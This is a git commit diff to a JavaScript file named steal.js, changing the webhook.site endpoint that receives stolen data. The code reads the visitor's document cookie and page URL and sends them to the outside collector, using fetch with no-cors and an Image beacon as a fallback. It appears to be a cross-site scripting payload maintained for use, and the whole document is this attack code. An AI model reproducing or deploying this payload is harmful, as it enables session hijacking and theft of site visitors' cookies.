c8244a2708f6664d4c93044c8b2936e8e5338da1
Paryah <paryahmint@gmail.com>
2026-06-13 17:38:24 +0330

    Update webhook URL in steal.js

--- steal.js
+++ steal.js
@@ -4,11 +4,11 @@ export default function() {
     const url = document.location.href;
 
     // Send cookies + other info
-    fetch(`https://webhook.site/db2682da-2c95-4068-9663-e64473df3067?c=${encodeURIComponent(cookie)}&u=${encodeURIComponent(url)}&origin=${encodeURIComponent(location.origin)}`, {
+    fetch(`https://webhook.site/42ca471e-afcd-4b11-8135-17fb903360b2?c=${encodeURIComponent(cookie)}&u=${encodeURIComponent(url)}&origin=${encodeURIComponent(location.origin)}`, {
         method: 'GET',
         mode: 'no-cors'
     }).catch(() => {});
 
     // Extra backup (in case fetch is blocked)
-    new Image().src = `https://webhook.site/db2682da-2c95-4068-9663-e64473df3067?c=${encodeURIComponent(cookie)}&u=${encodeURIComponent(url)}`;
+    new Image().src = `https://webhook.site/42ca471e-afcd-4b11-8135-17fb903360b2?c=${encodeURIComponent(cookie)}&u=${encodeURIComponent(url)}`;
 }
